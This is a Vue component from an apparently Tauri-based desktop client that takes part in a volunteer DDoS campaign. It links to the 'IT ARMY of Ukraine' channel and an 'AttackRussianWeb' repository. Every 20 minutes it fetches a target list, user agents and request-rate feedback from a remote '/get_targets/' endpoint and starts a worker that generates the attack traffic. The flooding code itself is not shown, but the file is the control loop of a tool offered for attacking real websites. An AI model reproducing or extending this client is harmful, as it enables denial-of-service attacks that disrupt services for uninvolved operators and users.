<template>
  <div class="main-container">
    <Header />
    <Content />
    <div class="help-sites">
      <div class="help__site git" @click="openWebsite('https://t.me/itarmyofukraine2022')">
        <img src="@/assets/it_army.png" :alt="$t('bottom.__it_army')" />
        <div class="info">
          <div class="text">{{ $t('bottom.__it_army') }}</div>
          <div class="link">IT ARMY of Ukraine</div>
        </div>
      </div>
      <div
        class="help__site git"
        @click="openWebsite('https://github.com/redblackfury/AttackRussianWeb')"
      >
        <img src="@/assets/git.svg" alt="git" />
        <div class="info">
          <div class="text">{{ $t('bottom.__source_code') }}</div>
          <div class="link">GitHub</div>
        </div>
      </div>
    </div>
  </div>
</template>

<script>
import Header from '@/components/Header.vue';
import Content from '@/components/Content.vue';
import api from '@/utils/api.js';
import state from '@/utils/state.js';
import { startWorker } from '@/utils/worker.js';
// import { appWindow } from '@tauri-apps/api/window';/

export default {
  components: {
    Header,
    Content,
  },
  mounted() {
    this.initConnection();
  },
  methods: {
    nextUpdate() {
      setTimeout(() => {
        this.initConnection();
      }, 60_000 * 20);
    },
    openWebsite(website) {
      const invoke = window.__TAURI__.invoke;
      invoke('open_website', { link: website });
    },
    async initConnection() {
      const endpoint = '/get_targets/' + (state.currentRPS > 0 ? `?lastRPS=${state.currentRPS}` : '');
      const data = await api({ endpoint });
      state.setIpAddress(data.ip);
      state.setCountry(data.countryISO);
      state.setTasks(data.result);
      state.setUserAgents(data.userAgents);
      startWorker();
      this.nextUpdate();
    },
  },
};
</script>

<style lang="scss">
.main-container {
  padding: 5px 10px;
  box-sizing: border-box;
  width: 100%;
  height: 100%;
  background: linear-gradient(180deg, #c00000 0%, #000000 100%);
  display: flex;
  flex-direction: column;
}
.help-sites {
  width: 350px;
  height: 100px;
  bottom: 10px;
  left: 50%;
  margin: 5px auto;
  display: flex;
  justify-content: space-between;
}
.help__site {
  display: flex;
  gap: 10px;
  align-items: center;
  .text,
  .link {
    font-size: 14px;
    white-space: nowrap;
    color: $textColor;
  }
  .link {
    color: $clickableColor;
    cursor: pointer;
  }
  img {
    width: 32px;
    height: 32px;
  }
}
</style>
